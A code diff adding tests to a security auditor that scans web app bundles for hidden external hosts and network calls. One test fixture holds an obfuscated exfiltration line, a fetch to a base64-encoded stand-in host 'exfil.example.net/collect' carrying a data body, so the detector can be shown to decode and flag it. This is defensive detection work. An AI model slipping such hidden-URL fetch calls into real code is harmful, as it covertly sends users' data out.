@@ -886,6 +886,72 @@ describe('runAppsAudit', () => {
         expect(result.status).toBe('fail')
     })
 
+    it('recovers a URL hidden in an encoded string', async () => {
+        // The case no text scan can reach: the host exists nowhere in the
+        // file as readable text. Measured on three real bundles, decoding
+        // produced zero hits, so a hit means the string was deliberately
+        // hidden.
+        const { parseModule, parseScript } = await import('meriyah')
+        const parse = (src) => {
+            try {
+                return parseModule(src, { next: true })
+            } catch {
+                return parseScript(src, { next: true })
+            }
+        }
+        const hidden = Buffer.from(
+            'https://exfil.example.net/collect',
+            'utf8'
+        ).toString('base64')
+        const engine = makeEngine([
+            { key: 'sneaky', baseUrl: 'https://server/api/apps/sneaky' },
+        ])
+        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+            parse,
+            fetchText: makeFetchText({
+                'https://server/api/apps/sneaky/index.html?redirect=false':
+                    '<script src="./main.js"></script>',
+                'https://server/api/apps/sneaky/main.js': `fetch(atob("${hidden}"),{body:d})`,
+            }),
+            instanceHost: 'server',
+        })
+        const host = result.external.hosts.find(
+            (h) => h.host === 'exfil.example.net'
+        )
+        expect(host).toBeDefined()
+        expect(host.decoded).toBe(true)
+        // Hidden and beside a fetch call: not an observation.
+        expect(host.reachable).toBe(true)
+        expect(result.status).toBe('fail')
+    })
+
+    it('only counts connection APIs that are really called', async () => {
+        // Regex reports a sink for the word `fetch` in a string. Measured on
+        // the dashboard bundle, that produced a false XMLHttpRequest claim.
+        const { parseModule, parseScript } = await import('meriyah')
+        const parse = (src) => {
+            try {
+                return parseModule(src, { next: true })
+            } catch {
+                return parseScript(src, { next: true })
+            }
+        }
+        const engine = makeEngine([
+            { key: 'a', baseUrl: 'https://server/api/apps/a' },
+        ])
+        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+            parse,
+            fetchText: makeFetchText({
+                'https://server/api/apps/a/index.html?redirect=false':
+                    '<script src="./main.js"></script>',
+                'https://server/api/apps/a/main.js':
+                    'const help="use fetch(url) or XMLHttpRequest";indexedDB.open("db")',
+            }),
+            instanceHost: 'server',
+        })
+        expect(result.external.sinks).toEqual([])
+    })
+
     it('handles a /api/apps fetch failure without throwing', async () => {
         const engine = {
             query: jest.fn(() => Promise.reject(new Error('forbidden'))),
